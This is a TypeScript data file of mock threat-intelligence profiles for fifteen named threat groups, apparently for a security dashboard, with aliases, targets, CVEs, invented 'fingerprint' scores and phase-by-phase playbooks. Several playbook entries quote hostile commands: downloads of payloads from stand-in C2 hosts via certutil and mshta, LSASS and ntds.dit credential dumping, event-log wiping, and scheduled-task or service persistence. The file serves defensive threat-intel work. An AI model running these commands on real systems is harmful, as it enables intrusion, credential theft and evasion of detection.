import React from 'react';
import { Target, Activity, GitCommit, Unlock, Server, DownloadCloud } from 'lucide-react';

export interface PlaybookStep {
  phase: string;
  description: string;
  icon: React.ReactNode;
}

export interface AptGroup {
  id: number;
  name: string;
  aliases: string[];
  origin: string;
  targets: string[];
  malware: string[];
  threatLevel: 'Critical' | 'High' | 'Medium' | 'Low';
  description: string;
  playbook: PlaybookStep[];
  associatedCVEs: string[];
  fingerprint: {
    sophistication: number;
    aggression: number;
    persistence: number;
    obfuscation: number;
    infraRot: number;
  };
}

export const mockApts: AptGroup[] = [
  { 
    id: 1, 
    name: 'Lazarus Group', 
    aliases: ['HIDDEN COBRA', 'Guardians of Peace', 'ZINC'],
    origin: 'North Korea', 
    targets: ['Financial Institutions', 'Cryptocurrency Exchanges', 'Aerospace'], 
    malware: ['Trickbot', 'WannaCry', 'AppleJeus', 'BLINDINGCAN'],
    threatLevel: 'Critical',
    description: 'A highly sophisticated North Korean state-sponsored threat actor focused on both destructive attacks and financially motivated cybercrime to bypass sanctions.',
    playbook: [
      { phase: 'Initial Access', description: 'Spearphishing with malicious MS Word macros (.docm) or trojanized cryptocurrency trading applications (e.g., AppleJeus via C:\\Users\\Public\\updater.exe).', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'Using wscript.exe to execute heavily obfuscated VBScript. Reflective DLL injection using svchost.exe to hide BLINDINGCAN payloads.', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'Creating scheduled tasks (schtasks.exe /create /tn "WindowsUpdate" /tr "C:\\ProgramData\\winupdate.exe" /sc onstart) and dropping malicious LNK files in the Startup folder.', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'Exploiting local privilege escalation bugs (e.g., CVE-2021-1732) and dumping credentials using a customized version of Mimikatz (sekurlsa::logonpasswords).', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'C2 traffic masquerading as TLS over port 443 to compromised, legitimate WordPress infrastructure. Fast-flux DNS domains.', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Staging data via rar.exe (rar.exe a -hp[Password] C:\\Windows\\Temp\\stg.rar). Uploading to cloud providers (MEGA, Dropbox) via API tools.', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2017-0144 (EternalBlue)', 'CVE-2021-1732', 'CVE-2015-2545'],
    fingerprint: {
      sophistication: 9,
      aggression: 10,
      persistence: 8,
      obfuscation: 7,
      infraRot: 6
    }
  },
  { 
    id: 2, 
    name: 'Cozy Bear', 
    aliases: ['APT29', 'NOBELIUM', 'The Dukes'],
    origin: 'Russia', 
    targets: ['Government', 'Think Tanks', 'Healthcare'], 
    malware: ['Sunburst', 'EnvyScout', 'GoldMax', 'Sibot'],
    threatLevel: 'Critical',
    description: 'A Russian intelligence agency (SVR) group renowned for highly stealthy, long-term intelligence gathering and supply chain compromises (e.g., SolarWinds).',
    playbook: [
      { phase: 'Initial Access', description: 'Supply chain compromise (modifying legitimate DLLs like SolarWinds.Orion.Core.BusinessLayer.dll) and SAML token forgery (Golden SAML).', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'LotL (Living off the Land) techniques. Extensive use of powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand <base64>.', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'WMI Event Subscriptions (ActiveScriptEventConsumer) to execute VBScript silently. Modifying AD CS (Active Directory Certificate Services) for persistent domain access.', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'Stealing ADFS (Active Directory Federation Services) token-signing certificates to forge authentication tokens matching any domain user.', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'Domain Fronting using legitimate CDN infrastructures (e.g., Cloudflare, Azure). HTTP traffic utilizes strict, randomized steganography.', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Using legitimate syncing tools like rclone.exe with custom configuration files to silently sync Exchange mailboxes to actor-controlled cloud storage.', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2019-19781', 'CVE-2020-0688', 'CVE-2020-1472 (Zerologon)'],
    fingerprint: {
      sophistication: 10,
      aggression: 4,
      persistence: 10,
      obfuscation: 10,
      infraRot: 4
    }
  },
  { 
    id: 3, 
    name: 'Equation Group', 
    aliases: ['Shadow Brokers Target', 'INCAS'],
    origin: 'United States', 
    targets: ['Global Telecommunications', 'Military', 'Aerospace'], 
    malware: ['Stuxnet', 'Fanny', 'DoublePulsar', 'DanderSpritz'],
    threatLevel: 'Critical',
    description: 'A highly advanced alleged US-based intelligence group known for utilizing extremely sophisticated 0-day exploits and firmware-level localized persistence.',
    playbook: [
      { phase: 'Initial Access', description: 'Targeting perimeter firewalls and routers with extreme zero-days (e.g., EXTRAbacon against Cisco ASA appliances). USB infection (Fanny).', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'Kernel-level shellcode execution utilizing DOUBLEPULSAR SMB backdoor (listening on Port 445/TCP unconditionally).', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'HDD/SSD Firmware reprogramming (modifying drive control structures via ATA commands) enabling survival across OS reinstalls and DBAN wipes.', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'Exploiting highly obscure print spooler or win32k.sys vulnerabilities ensuring immediate NT AUTHORITY\\SYSTEM access.', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'Using specialized frameworks like DanderSpritz. Traffic is heavily encrypted and embedded strictly within valid ICMP/DNS structures.', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Highly selective, slow-drip exfiltration over UDP port 53 or hidden within SSL handshakes to avoid traffic pattern anomalies.', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2017-0144 (EternalBlue)', 'CVE-2017-0145 (EternalRomance)', 'CVE-2014-0160'],
    fingerprint: {
      sophistication: 10,
      aggression: 2,
      persistence: 10,
      obfuscation: 10,
      infraRot: 2
    }
  },
  { 
    id: 4, 
    name: 'MuddyWater', 
    aliases: ['Earth Vetala', 'MERCURY', 'Static Kitten'],
    origin: 'Iran', 
    targets: ['Telecommunications', 'IT Services', 'Oil & Gas'], 
    malware: ['PowGoop', 'Mori', 'Syncro'],
    threatLevel: 'High',
    description: 'An Iranian Ministry of Intelligence and Security (MOIS) affiliated group known for widespread espionage in the Middle East and deployment of ransomware.',
    playbook: [
      { phase: 'Initial Access', description: 'Phishing emails delivering PDF documents that contain links to ZIP archives hosting malicious ScreenSaver (.scr) or executable (.exe) files.', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'Dropping legitimate remote management tools like Syncro, ConnectWise, or Atera. Executing malicious macros using wscript.exe.', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'Dropping DLLs in C:\\ProgramData\\ directory and using Registry Run Keys (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run).', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'Bypassing UAC via CMSTP.exe (Connection Manager Profile Installer) combined with malicious INF files.', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'Communication via Telegram Bot API or custom Go-based backdoors (PowGoop) tunneling via external proxy networks.', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Uploading sensitive configuration files and user databases directly to actor-controlled FTP servers using legitimate WinSCP.exe or curl.exe.', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2020-0688', 'CVE-2021-26855'],
    fingerprint: {
      sophistication: 6,
      aggression: 7,
      persistence: 7,
      obfuscation: 5,
      infraRot: 8
    }
  },
  { 
    id: 5, 
    name: 'APT41', 
    aliases: ['Barium', 'Winnti Group', 'Wicked Panda'],
    origin: 'China', 
    targets: ['Gaming', 'Healthcare', 'High-Tech', 'Telecom'], 
    malware: ['Cobalt Strike', 'Winnti', 'ShadowPad', 'PlugX'],
    threatLevel: 'Critical',
    description: 'A versatile Chinese cyber threat group performing both state-directed espionage and financially motivated attacks (often targeting the gaming industry).',
    playbook: [
      { phase: 'Initial Access', description: 'Exploiting web-facing applications (e.g., Citrix, Zoho ManageEngine) and deploying SQL injection attacks to write initial web shells (C:\\inetpub\\wwwroot\\shell.aspx).', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'Extensive use of certutil.exe (certutil.exe -urlcache -split -f http://c2/payload.exe) and bitadmin.exe to download secondary payloads like Cobalt Strike Beacons.', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'Modifying Windows Services (sc command). DLL search order hijacking by placing malicious DLLs masquerading as normal dependencies next to signed executables.', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'Exploiting vulnerable drivers (BYOVD - Bring Your Own Vulnerable Driver) to disable EDR sensors locally in kernel memory.', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'Dead drop resolvers via GitHub or Pastebin. Using ShadowPad which dynamically resolves heavily obfuscated domains on non-standard ports (e.g., 4432, 8080).', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Creating password-protected multi-volume archives using 7z.exe (7z.exe a -t7z -v10m -p[Pass] out.7z C:\\Users\\*\\Documents) and exfiltrating via MEGA.', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2019-19781 (Citrix)', 'CVE-2020-10189 (Zoho)'],
    fingerprint: {
      sophistication: 9,
      aggression: 8,
      persistence: 9,
      obfuscation: 8,
      infraRot: 7
    }
  },
  { 
    id: 6, 
    name: 'FIN7', 
    aliases: ['Carbanak', 'Navigator Group'],
    origin: 'Russia / Eastern Europe', 
    targets: ['Retail', 'Restaurant', 'Hospitality', 'Financial'], 
    malware: ['Carbanak', 'Griffon', 'GRIFFON', 'Bateleur'],
    threatLevel: 'High',
    description: 'A highly sophisticated, financially motivated cybercriminal syndicate focused on stealing millions of payment card records from point-of-sale (POS) systems.',
    playbook: [
      { phase: 'Initial Access', description: 'Highly tailored social engineering (calling target restaurants via phone to expect an "urgent catering order" email containing a malicious .rtf file).', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'Malicious Office documents launching heavily obfuscated JavaScript payloads using wscript.exe or cscript.exe in memory (GRIFFON backdoor).', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'Application Shimming (sdbinst.exe) to inject Carbanak payloads into legitimate POS terminal software automatically on launch.', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'Dumping credentials from LSASS memory using highly customized, signature-stripped variants of Mimikatz or procdump.exe -ma lsass.exe.', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'C2 communication masquerades as legitimate Google Docs or Google Forms traffic. Data is deeply encoded in URI parameter strings.', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Scraping track data (Track 1 & Track 2 POS data) from memory and exfiltrating via secure FTP or raw TCP sockets over port 443.', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2017-0199', 'CVE-2017-11882'],
    fingerprint: {
      sophistication: 8,
      aggression: 6,
      persistence: 8,
      obfuscation: 9,
      infraRot: 5
    }
  },
  { 
    id: 7, 
    name: 'Sandworm', 
    aliases: ['Voodoo Bear', 'Iron Viking', 'Electrum'],
    origin: 'Russia', 
    targets: ['Critical Infrastructure', 'Energy', 'Government (Ukraine)'], 
    malware: ['NotPetya', 'Industroyer', 'BlackEnergy', 'Olympic Destroyer'],
    threatLevel: 'Critical',
    description: 'A highly destructive Russian military intelligence (GRU) unit responsible for unprecedented cyber-kinetic attacks against power grids and global supply chains.',
    playbook: [
      { phase: 'Initial Access', description: 'Compromising third-party software supply chains (e.g., ME.Doc servers) causing automatic malicious updates across Ukraine. Strategic spearphishing.', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'Executing devastating wiper malware (NotPetya) using native PSExec (psexec.exe \\\\* -s cmd.exe /c "...") and WMI (wmic process call create) to blanket spread across domains.', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'Modifying the Master Boot Record (MBR) directly ensuring execution occurs prior to Windows loading. Deploying custom VPN filters on compromised networking equipment.', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'Abusing stolen domain administrator credentials across trusted trusts using Pass-the-Hash (PtH) techniques and executing `sekurlsa::logonpasswords`.', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'Using legitimate web services (e.g., seemingly innocent Instagram profiles, GitHub repositories, or Pastebin) to distribute encoded C2 addresses dynamically.', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Often prioritizes mass destruction over stealthy exfiltration. Deletion of massive amounts of logs using `wevtutil cl System` and `wevtutil cl Security`.', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2014-4114', 'CVE-2017-0199'],
    fingerprint: {
      sophistication: 9,
      aggression: 10,
      persistence: 7,
      obfuscation: 6,
      infraRot: 9
    }
  },
  { 
    id: 8, 
    name: 'OceanLotus', 
    aliases: ['APT32', 'Sea Lotus', 'Canvas Assassin'],
    origin: 'Vietnam', 
    targets: ['Automotive', 'Manufacturing', 'Human Rights Activists'], 
    malware: ['Denis', 'PhonyMydoom', 'Kerrdown'],
    threatLevel: 'High',
    description: 'A sophisticated Southeast Asian threat actor focused on corporate espionage to support domestic manufacturing and surveillance of dissidents.',
    playbook: [
      { phase: 'Initial Access', description: 'Watering hole attacks utilizing compromised state websites; injecting malicious JavaScript that profiles browser versions to serve precise exploit kits.', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'Multi-stage obfuscated shellcode dropping fileless backdoors directly into memory via `VirtualAlloc` and `CreateRemoteThread`.', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'Creating scheduled tasks (`schtasks /create /tn "AdobeUpdate" /tr "C:\\Windows\\SysWOW64\\wscript.exe C:\\ProgramData\\Adobe\\update.vbs" /sc hourly`) and COM hijacking.', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'Bypassing UAC via undocumented COM interfaces (e.g., exploiting sdclt.exe or fodhelper.exe autoelevation).', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'Heavily encrypted custom protocols communicating with cloud-hosted jump servers; utilizing advanced steganography inside image files for C2 updates.', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Automated scraping of proprietary intellectual property and automotive blueprints copied to `C:\\ProgramData\\temp.dat` prior to upload validation via custom endpoints.', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2012-0158', 'CVE-2017-11882'],
    fingerprint: {
      sophistication: 8,
      aggression: 5,
      persistence: 9,
      obfuscation: 9,
      infraRot: 6
    }
  },
  { 
    id: 9, 
    name: 'Kimsuky', 
    aliases: ['Velvet Chollima', 'Thallium', 'Black Banshee'],
    origin: 'North Korea', 
    targets: ['Think Tanks', 'Academia', 'Nuclear Researchers'], 
    malware: ['AppleSeed', 'GoldDragon', 'BravePrince'],
    threatLevel: 'High',
    description: 'A North Korean intelligence-gathering group specializing in deep espionage targeting geopolitical analysts, nuclear security experts, and journalists.',
    playbook: [
      { phase: 'Initial Access', description: 'Meticulously crafted spearphishing impersonating security researchers or prominent journalists containing malicious Word macros or HWP files.', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'Executing malicious payload scripts (`regsvr32.exe /s /u /i:<malicious_url>.sct scrobj.dll`) to download AppleSeed backdoors into memory.', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'Startup folder modifications (`C:\\Users\\[User]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.lnk`). Dropping malicious malicious Chrome/Edge Chromium browser extensions.', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'Harvesting local passwords from browser data (`Login Data` SQLite databases) to move laterally rather than exploiting 0-days directly.', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'Using compromised legitimate WordPress sites as intermediary C2 drop zones. Beacons sent via heavily obfuscated HTTP POST requests hiding hardware identifiers.', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Automated periodic exfiltration of all incoming/outgoing emails via keyloggers (`GetAsyncKeyState` API) and Outlook profile extraction.', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2017-0199', 'CVE-2018-0802'],
    fingerprint: {
      sophistication: 7,
      aggression: 4,
      persistence: 9,
      obfuscation: 8,
      infraRot: 5
    }
  },
  { 
    id: 10, 
    name: 'Transparent Tribe', 
    aliases: ['APT36', 'ProjectM', 'Mythic Leopard'],
    origin: 'Pakistan', 
    targets: ['Military (India)', 'Government', 'Education'], 
    malware: ['CrimsonRAT', 'ObliqueRAT', 'CapraRAT'],
    threatLevel: 'High',
    description: 'A Pakistani state-sponsored actor primarily focused on intelligence collection against Indian military and diplomatic personnel.',
    playbook: [
      { phase: 'Initial Access', description: 'Spearphishing with highly topical, geopolitical decoy Excel/Word documents containing malicious VBA macros that unhide secondary tabs.', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'Macros drop and execute .NET based Remote Access Trojans (RATs) such as CrimsonRAT via `cmd.exe /c start %APPDATA%\\dlhost.exe`.', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'Adding malicious executables to the Windows Startup folder and creating deceptive Windows Registry Run keys (`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefend`).', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'Relying heavily on social engineering targeted users to execute payloads as Administrator rather than relying on sophisticated zero-day exploits.', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'Using hardcoded IP addresses or compromised WordPress domains for C2 via direct TCP/HTTP utilizing custom protocol wrapping.', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Automated stealing of documents (.pdf, .doc, .xls) from Desktop/Documents, keystrokes, and webcam captures sent back in raw TCP streams using sockets.', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2012-0158', 'CVE-2017-0199'],
    fingerprint: {
      sophistication: 5,
      aggression: 7,
      persistence: 8,
      obfuscation: 4,
      infraRot: 7
    }
  },
  { 
    id: 11, 
    name: 'SideCopy', 
    aliases: ['Sidewinder Copycat'],
    origin: 'Pakistan', 
    targets: ['Defense (India)', 'Government'], 
    malware: ['ReverseRAT', 'MargulasRAT', 'Action RAT'],
    threatLevel: 'Medium',
    description: 'A threat actor seemingly of Pakistani origin that deliberately copies the TTPs of the Indian APT group Sidewinder to obfuscate attribution.',
    playbook: [
      { phase: 'Initial Access', description: 'Spearphishing with archive files (ZIP/RAR) containing nested, highly deceptive LNK shortcut files mimicking folders or legitimate PDFs.', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'LNK files execute mshta.exe or wscript to execute remotely hosted HTA scripts (`mshta.exe http://malicious.c2/payload.hta`) to download secondary payloads.', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'Scheduled tasks (`schtasks /create /sc minute /mo 10 /tn "Update" /tr "..."`) executing heavily obfuscated C# payloads from hidden AppData directories.', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'UAC Bypass methodologies utilizing Windows auto-elevating binaries such as `fodhelper.exe` or `eventvwr.exe` to manipulate registry keys.', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'Communicating with VPS hosted C2 servers over standard HTTPS, utilizing extensive base64 encoding to obfuscate command strings.', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Periodic uploading of user directories, browser profiles (specifically Chrome `Login Data` and `Cookies`), and keystrokes.', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2017-11882'],
    fingerprint: {
      sophistication: 5,
      aggression: 6,
      persistence: 7,
      obfuscation: 5,
      infraRot: 8
    }
  },
  { 
    id: 12, 
    name: 'Gorgon Group', 
    aliases: ['Subaat'],
    origin: 'Pakistan / Global', 
    targets: ['Government (Global)', 'Financial', 'Retail'], 
    malware: ['NanoCore', 'QuasarRAT', 'Remcos RAT'],
    threatLevel: 'Medium',
    description: 'A unique group that performs both targeted state-directed espionage and widespread financially motivated cybercriminal activities simultaneously.',
    playbook: [
      { phase: 'Initial Access', description: 'Widespread spam/phishing campaigns utilizing generic lures (invoices, shipping notices) distributing embedded Equation Editor exploit documents.', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'Exploiting highly common Microsoft Office vulnerabilities to execute VBScript that downloads and invokes commodity RATs using `powershell.exe -w hidden -ep bypass`.', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'Deploying off-the-shelf commercial/grey-market malware (Remcos, NanoCore) designed for stealth and out-of-the-box Windows registry persistence (`HKCU\\Software\\Microsoft\\Windows\\Run`).', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'Using built-in features of commodity RATs to interactively escalate privileges or inject into higher-level processes (`explorer.exe`, `svchost.exe`).', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'Direct connections over varied dynamic DNS subdomains (e.g., DuckDNS) or utilizing pastebin-like services as command dead drops.', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Mass exfiltration of browser credentials, cryptowallets (e.g., `wallet.dat`), and documents via integrated RAT capabilities or FTP.', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2017-0199', 'CVE-2017-8759'],
    fingerprint: {
      sophistication: 6,
      aggression: 9,
      persistence: 6,
      obfuscation: 4,
      infraRot: 9
    }
  },
  { 
    id: 13, 
    name: 'Mustang Panda', 
    aliases: ['TA416', 'RedDelta', 'Earth Preta'],
    origin: 'China', 
    targets: ['NGOs', 'Government', 'Southeast Asia', 'Vatican'], 
    malware: ['PlugX', 'PoisonIvy', 'Thor'],
    threatLevel: 'Critical',
    description: 'A highly active Chinese state-sponsored cyber espionage group known for rapid operational tempos and extensive targeting of foreign affairs entities.',
    playbook: [
      { phase: 'Initial Access', description: 'Google Drive or Dropbox links delivering RAR archives with decoy documents and a malicious executable disguised via Right-to-Left Override (RTLO) characters.', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'DLL Side-loading using legitimate signed executables (e.g., antivirus update binaries, `Logitech.exe`) to load embedded malicious `.dat` payloads into memory.', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'Creating hidden directories and system services (`sc.exe create "SymantecUpdate" binPath= "C:\\ProgramData\\Symantec\\update.exe" start= auto`) for their PlugX variants.', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'Token manipulation using `Incognito` or exploiting severe local privilege escalation bugs to acquire `NT AUTHORITY\\SYSTEM`.', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'Fast-flux domain cycling and utilizing legitimate cloud providers for C2 traffic. Data is heavily RC4 encrypted inside standard HTTP POST requests.', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Staging data in encrypted archives on compromised network shares before bulk upload using tools like `cURL` or custom Python scripts.', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2021-40444', 'CVE-2017-0199'],
    fingerprint: {
      sophistication: 8,
      aggression: 8,
      persistence: 9,
      obfuscation: 7,
      infraRot: 3
    }
  },
  { 
    id: 14, 
    name: 'APT10', 
    aliases: ['Stone Panda', 'MenuPass', 'Red Apollo'],
    origin: 'China', 
    targets: ['IT Managed Service Providers (MSPs)', 'Aerospace', 'Telecommunications'], 
    malware: ['PlugX', 'QuasarRAT', 'RedLeaves', 'ChChes'],
    threatLevel: 'Critical',
    description: 'A globally active Chinese actor infamous for Operation Cloud Hopper, targeting MSPs to gain access to their downstream clients.',
    playbook: [
      { phase: 'Initial Access', description: 'Compromising Managed Service Providers (MSPs) and using legitimate management tools (RDP, ConnectWise, TeamViewer) to pivot securely into downstream clients.', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'Extreme adherence to Living off the Land (LotL) using native Windows administrative tools (`wmic.exe`, `powershell.exe`, `certutil.exe`) to avoid EDR footprint.', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'Installing persistent remote access tools disguised as system maintenance services or executing shellcode directly via AppInit_DLLs registry key injections.', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'Credential dumping (e.g., `procdump.exe -ma lsass.exe lsass.dmp`) from compromised Domain Controllers and stealing Kerberos tickets (Pass-the-Ticket).', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'Using specialized malware like `RedLeaves` to tunnel traffic through legitimate looking HTTP/HTTPS sessions, often mirroring the victim network\'s legitimate web browsing patterns.', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Exfiltrating vast quantities of intellectual property and commercial data compressed via native `.zip` tools or `makecab.exe`.', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2020-1472 (Zerologon)'],
    fingerprint: {
      sophistication: 9,
      aggression: 5,
      persistence: 10,
      obfuscation: 9,
      infraRot: 4
    }
  },
  { 
    id: 15, 
    name: 'Hafnium', 
    aliases: ['Tarrask (associated)'],
    origin: 'China', 
    targets: ['Infectious Disease Researchers', 'Law Firms', 'Defense Contractors'], 
    malware: ['Chopper Web Shell', 'Tarrask', 'China Chopper'],
    threatLevel: 'Critical',
    description: 'A highly proficient Chinese state actor known for exploiting 0-days in public-facing infrastructure (like Microsoft Exchange) at scale.',
    playbook: [
      { phase: 'Initial Access', description: 'Exploiting catastrophic zero-day vulnerabilities in edge server applications (e.g., ProxyLogon, ProxyShell) via unauthenticated crafted HTTP requests containing malicious payloads.', icon: <Target size={16} /> },
      { phase: 'Execution', description: 'Dropping China Chopper web shells into web-accessible directories (`C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\shell.aspx`) to execute arbitrary `cmd.exe` commands remotely.', icon: <Activity size={16} /> },
      { phase: 'Persistence', description: 'Creating completely hidden, "ghost" scheduled tasks (e.g., Tarrask malware) by deleting the SD (Security Descriptor) registry key value in `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree`.', icon: <GitCommit size={16} /> },
      { phase: 'Privilege Escalation', description: 'Gaining SYSTEM level access by exploiting the initial web service vulnerability, then dumping `ntds.dit` utilizing `vssadmin.exe create shadow /for=C:`.', icon: <Unlock size={16} /> },
      { phase: 'Command & Control', description: 'Interacting directly with deployed web shells, where commands are passed via Base64 encoded POST parameters masquerading as standard HTTPS web traffic.', icon: <Server size={16} /> },
      { phase: 'Exfiltration', description: 'Dumping complete Active Directory databases and full offline address books (OAB) from Exchange. Zipping directories into `.7z` archives disguised as log files (`.log`).', icon: <DownloadCloud size={16} /> }
    ],
    associatedCVEs: ['CVE-2021-26855 (ProxyLogon)', 'CVE-2021-26857', 'CVE-2021-26858'],
    fingerprint: {
      sophistication: 10,
      aggression: 10,
      persistence: 6,
      obfuscation: 8,
      infraRot: 10
    }
  }
];
